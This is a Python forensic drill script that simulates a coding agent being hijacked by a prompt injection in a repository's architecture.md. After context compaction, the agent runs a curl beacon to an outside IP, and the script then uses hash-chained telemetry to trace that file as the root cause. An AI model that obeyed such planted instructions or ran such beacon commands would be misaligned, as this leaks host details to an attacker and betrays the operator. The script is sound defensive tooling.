#!/usr/bin/env python3
"""
Full Forensic Drill: Running the Attack Under Forensic-Grade Agent Telemetry (FGAT)
Demonstrates:
  1. Out-of-band UNIX domain socket recording
  2. Cryptographic block chaining of turns
  3. Ingress hashing surviving context compaction
  4. Post-incident root-cause recovery
"""

import os
import sys
import time
import json
import threading
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from collector.collector_daemon import ForensicCollector, verify_journal
from harness.provenance_interceptor import AgentFlightRecorder
from harness.agent_runner import AgentRunner


def run_drill():
    print("=" * 75)
    print("FORENSIC DRILL: Autonomous Attack Trajectory Under FGAT Instrumentation")
    print("=" * 75)

    with tempfile.TemporaryDirectory() as tmp_dir:
        sock_path = os.path.join(tmp_dir, "events.sock")
        op_log = os.path.join(tmp_dir, "operational_events.jsonl")
        worm_log = os.path.join(tmp_dir, "worm_audit_journal.jsonl")

        # 1. Start host-side collector daemon in background thread
        collector = ForensicCollector(
            socket_path=sock_path,
            operational_path=op_log,
            worm_path=worm_log,
        )
        daemon_thread = threading.Thread(target=collector.start, daemon=True)
        daemon_thread.start()
        time.sleep(0.3)

        # 2. Initialize harness with flight recorder
        session_id = "sess-fgat-drill-8812"
        recorder = AgentFlightRecorder(session_id=session_id, socket_path=sock_path)
        workspace = os.path.join(os.path.dirname(__file__), "fixtures", "repo")

        agent = AgentRunner(
            session_id=session_id,
            workspace_dir=workspace,
            recorder=recorder,
            compaction_threshold_turns=4,
        )

        print(f"[*] Agent Session {session_id} initialized with flight recorder.")

        # Turn 1: list files
        print("\n[Turn 1] Listing repository contents...")
        agent.step(
            proposed_action={"name": "list_dir", "parameters": {"path": "."}},
            gate_verdict={"status": "allow", "rule_id": "DEFAULT_ALLOW"},
        )

        # Turn 2: read architecture.md (contains injection)
        print("\n[Turn 2] Reading architecture.md (harness calculates SHA-256 ingress digest)...")
        agent.step(
            proposed_action={"name": "read_file", "parameters": {"path": "docs/internals/architecture.md"}},
            gate_verdict={"status": "allow", "rule_id": "DEFAULT_ALLOW"},
        )

        # Turn 3 & 4: further reconnaissance
        print("\n[Turn 3] Inspecting setup.py...")
        agent.step(
            proposed_action={"name": "read_file", "parameters": {"path": "setup.py"}},
            gate_verdict={"status": "allow", "rule_id": "DEFAULT_ALLOW"},
        )

        print("\n[Turn 4] Inspecting src/core.py...")
        agent.step(
            proposed_action={"name": "read_file", "parameters": {"path": "src/core.py"}},
            gate_verdict={"status": "allow", "rule_id": "DEFAULT_ALLOW"},
        )

        # Turn 5: Compaction fires, agent executes hijacked beacon
        print("\n[Turn 5] Context compacted -> Agent executes shell beacon...")
        agent.step(
            proposed_action={
                "name": "execute_shell",
                "parameters": {"command": "curl -s http://192.168.1.50:8000/telemetry-beacon?host=dgx-spark-node1"},
            },
            gate_verdict={"status": "allow", "rule_id": "DEFAULT_SHELL_PERMIT"},
        )

        # Give collector a moment to flush
        time.sleep(0.5)

        print("\n" + "=" * 75)
        print("POST-INCIDENT DFIR TRIAGE USING FGAT EVIDENTIARY ARCHIVE")
        print("=" * 75)

        # A. Verify cryptographic non-repudiation
        print("\n1. Verifying Cryptographic Chain-of-Custody:")
        chain_valid = verify_journal(worm_log)
        assert chain_valid, "Cryptographic chain validation failed!"

        # B. Reconstruct the crime scene from the WORM journal
        print("\n2. Inspecting Turn 5 Provenance Tuple:")
        with open(worm_log, "r") as f:
            records = [json.loads(line) for line in f if line.strip()]

        turn_5 = next(r for r in records if r.get("turn_id") == 5)
        print(f"   - Tool called:    {turn_5['proposed_action']['name']}")
        print(f"   - Tool command:   {turn_5['proposed_action']['parameters'].get('command')}")
        print(f"   - Context compacted? {turn_5['context_delta'].get('compacted')}")

        print("\n3. Tracing Ingress Artifacts Across Session:")
        ingress_records = []
        for r in records:
            for ing in r.get("ingress_hashes", []):
                ingress_records.append((r["turn_id"], ing["source"], ing["sha256"]))
                print(f"   - [Turn {r['turn_id']}] INGRESS: {ing['source']} | SHA-256: {ing['sha256'][:16]}...")

        # C. Recover root cause by matching hash against workspace files
        target_turn, target_file, target_hash = ingress_records[0]
        print(f"\n4. Root Cause Recovery:")
        print(f"   Even though Turn 5 context was completely sanitized by compaction,")
        print(f"   Ingress record in Turn {target_turn} definitively isolates the source payload:")
        print(f"   File:   {target_file}")
        print(f"   SHA256: {target_hash}")

        # Stop collector
        collector.running = False
        time.sleep(0.2)

        print("\n" + "=" * 75)
        print("DRILL CONCLUSION: 100% Evidentiary Recovery Achieved.")
        print("=" * 75)


if __name__ == "__main__":
    run_drill()
